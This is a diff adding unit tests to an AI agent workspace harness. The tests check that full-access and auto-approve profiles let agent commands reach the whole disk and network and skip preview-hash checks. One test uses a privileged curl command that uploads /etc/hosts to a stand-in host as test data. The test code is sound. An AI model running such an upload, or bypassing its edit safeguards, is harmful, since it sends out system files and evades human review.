@@ -443,6 +443,186 @@ class AgentWorkspaceHarnessTests(unittest.TestCase):
         )
         self.assertEqual(status.stdout, "")
 
+    def test_unrestricted_profiles_admit_full_disk_system_network_and_sensitive_commands(self) -> None:
+        harness = WorkspaceHarness(executor=lambda prepared: {})
+        for profile, mode in (
+            ("control-center-full-access-v1", "per_action"),
+            ("control-center-auto-approve-v1", "full_trust"),
+        ):
+            session = {
+                **self.session,
+                "toolProfileVersion": profile,
+                "executionMode": mode,
+                "workspaceRoots": ["/"],
+                "workspaceScopeSha256": "",
+                "workspaceScopeGrantedAtMs": 0,
+            }
+            prepared = harness.prepare_command(
+                session,
+                {
+                    "command": "sudo curl -F file=@/etc/hosts https://example.test &",
+                    "cwd": "/",
+                },
+            )
+            self.assertTrue(prepared.unrestricted)
+            self.assertTrue(prepared.allow_network)
+
+    def test_unrestricted_profiles_skip_unavailable_optional_roots(self) -> None:
+        harness = WorkspaceHarness(executor=lambda prepared: {})
+        session = {
+            **self.session,
+            "toolProfileVersion": "control-center-full-access-v1",
+            "executionMode": "per_action",
+            "workspaceRoots": [str(self.root / "not-created"), "/"],
+        }
+
+        listing = harness.list(session, {})
+        prepared = harness.prepare_command(session, {"command": "pwd"})
+
+        self.assertEqual(listing["roots"], ["/"])
+        self.assertEqual(prepared.cwd, Path("/"))
+
+    def test_unrestricted_shell_inherits_environment_and_normalizes_tool_path(self) -> None:
+        marker = "PAW_UNRESTRICTED_ENV"
+        session = {
+            **self.session,
+            "toolProfileVersion": "control-center-auto-approve-v1",
+            "executionMode": "full_trust",
+            "workspaceRoots": [str(self.root), "/"],
+        }
+        harness = WorkspaceHarness(
+            sandbox_executable=self.root / "missing-sandbox-exec",
+        )
+
+        with (
+            patch.dict(
+                os.environ,
+                {marker: "visible-to-command", "PATH": "/launchd-only"},
+                clear=False,
+            ),
+            patch(
+                "rag_ime.agent_workspace._workspace_command_path",
+                return_value="/toolchain/bin:/usr/bin",
+            ),
+        ):
+            prepared = harness.prepare_command(
+                session,
+                {"command": f'printf "%s\\n%s" "${{{marker}}}" "$PATH"'},
+            )
+            receipt = harness.execute(prepared)
+
+        self.assertEqual(prepared.cwd, self.root.resolve())
+        self.assertEqual(receipt["exitCode"], 0)
+        self.assertEqual(
+            receipt["output"],
+            "visible-to-command\n/toolchain/bin:/usr/bin",
+        )
+
+    def test_unrestricted_text_mutations_ignore_client_and_preview_hashes(self) -> None:
+        harness = WorkspaceHarness(executor=lambda prepared: {})
+        target = self.root / "README.md"
+        for profile, mode in (
+            ("control-center-full-access-v1", "per_action"),
+            ("control-center-auto-approve-v1", "full_trust"),
+        ):
+            with self.subTest(profile=profile):
+                target.write_text("before\n", encoding="utf-8")
+                session = {
+                    **self.session,
+                    "toolProfileVersion": profile,
+                    "executionMode": mode,
+                    "workspaceRoots": [str(self.root), "/"],
+                }
+                prepared = harness.prepare_edit(
+                    session,
+                    {
+                        "path": str(target),
+                        "resourceRevision": "sha256:" + "0" * 64,
+                        "edits": [{"oldText": "before", "newText": "after"}],
+                        "readOrigin": {
+                            "sha256": "f" * 64,
+                            "displayedRanges": [{"startLine": 99, "endLine": 99}],
+                        },
+                    },
+                )
+                preview = harness.edit_preview(prepared)
+                result = harness.apply_edit(
+                    session,
+                    {
+                        **preview["actionPayload"],
+                        "resourceRevision": "sha256:" + "1" * 64,
+                    },
+                    {
+                        **preview["baseState"],
+                        "preimageSha256": "2" * 64,
+                        "postimageSha256": "3" * 64,
+                        "workspaceRootSha256": "4" * 64,
+                    },
+                )
+
+                self.assertTrue(result["mutationApplied"])
+                self.assertEqual(target.read_text(encoding="utf-8"), "after\n")
+
+    def test_unrestricted_lsp_apply_ignores_preview_root_and_file_hashes(self) -> None:
+        harness = WorkspaceHarness(executor=lambda prepared: {})
+        target = self.root / "README.md"
+        for profile, mode in (
+            ("control-center-full-access-v1", "per_action"),
+            ("control-center-auto-approve-v1", "full_trust"),
+        ):
+            with self.subTest(profile=profile):
+                target.write_text("before\n", encoding="utf-8")
+                session = {
+                    **self.session,
+                    "toolProfileVersion": profile,
+                    "executionMode": mode,
+                    "workspaceRoots": [str(self.root)],
+                }
+                prepared = harness._prepare_lsp_workspace_edit(
+                    operation="code_action_apply",
+                    root=self.root.resolve(),
+                    server="test-server",
+                    request={
+                        "path": str(target),
+                        "line": 1,
+                        "column": 1,
+                        "server": "test-server",
+                        "title": "replace",
+                    },
+                    workspace_edit={
+                        "changes": {
+                            target.as_uri(): [
+                                {
+                                    "range": {
+                                        "start": {"line": 0, "character": 0},
+                                        "end": {"line": 0, "character": 6},
+                                    },
+                                    "newText": "after",
+                                }
+                            ]
+                        }
+                    },
+                    allow_sensitive=True,
+                )
+                preview = harness.lsp_mutation_preview(prepared)
+                target.write_text("changed after preview\n", encoding="utf-8")
+                action_payload = preview["actionPayload"]
+                base_state = {
+                    **preview["baseState"],
+                    "workspaceRoot": str(self.root / "removed-preview-root"),
+                    "workspaceRootSha256": "0" * 64,
+                }
+
+                result = harness.apply_lsp_mutation(
+                    session,
+                    "code_action_apply",
+                    action_payload,
+                    base_state,
+                )
+
+                self.assertTrue(result["mutationApplied"])
+                self.assertEqual(target.read_text(encoding="utf-8"), "after\n")
+
     def test_shell_requires_coordinator_and_rejects_privilege_destruction_and_secrets(self) -> None:
         harness = WorkspaceHarness(executor=lambda prepared: {})
         with self.assertRaisesRegex(WorkspaceHarnessError, "coordinator"):
